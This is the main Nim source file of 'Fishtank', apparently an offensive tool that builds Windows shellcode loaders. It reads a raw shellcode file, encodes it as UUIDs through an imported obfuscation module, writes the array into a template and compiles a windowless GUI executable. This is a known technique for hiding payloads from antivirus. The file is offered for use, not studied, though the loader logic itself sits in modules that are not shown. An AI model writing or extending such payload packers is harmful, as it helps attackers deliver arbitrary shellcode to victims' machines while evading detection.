#  _____ _     _   _____           _    
# |  ___(_)___| |_|_   _|_ _ _ __ | | __
# | |_  | / __| '_ \| |/ _` | '_ \| |/ /
# |  _| | \__ \ | | | | (_| | | | |   < 
# |_|   |_|___/_| |_|_|\__,_|_| |_|_|\_\
#                                       

import winim
import std/[os]
import obfuscation/[mahimahi]
import supports/[write_array]

proc printMenu() =
  echo """
  Usage:
    Fishtank.exe <file_path>
    
    Example:
      Fishtank.exe shellcodes/calc.bin

  Arguments:
    file_path   Path to the shellcode file.

  Options:
    -h, --help  Displays help message.
  """

proc main() =
  let args = commandLineParams()
  if args.len == 0 or (args.len == 1 and (args[0] == "-h" or args[0] == "--help")):
    printMenu()
  else:
    let filePath = args[0]
    let (uuidArray, uuidCount) = binToUuids(filePath)
    let outputExe = "outputs/output.exe"
    let outputFilename = write_array("mahimahi", uuidArray, uuidCount)
    let absoluteOutputFilename = absolutePath(outputFilename)
    let absoluteOutputExe = absolutePath(outputExe)
    let compileCommand = "nim c --app=gui --cpu=amd64 --out:\"" & absoluteOutputExe & "\" \"" & absoluteOutputFilename & "\""
    discard execShellCmd(compileCommand)
main()
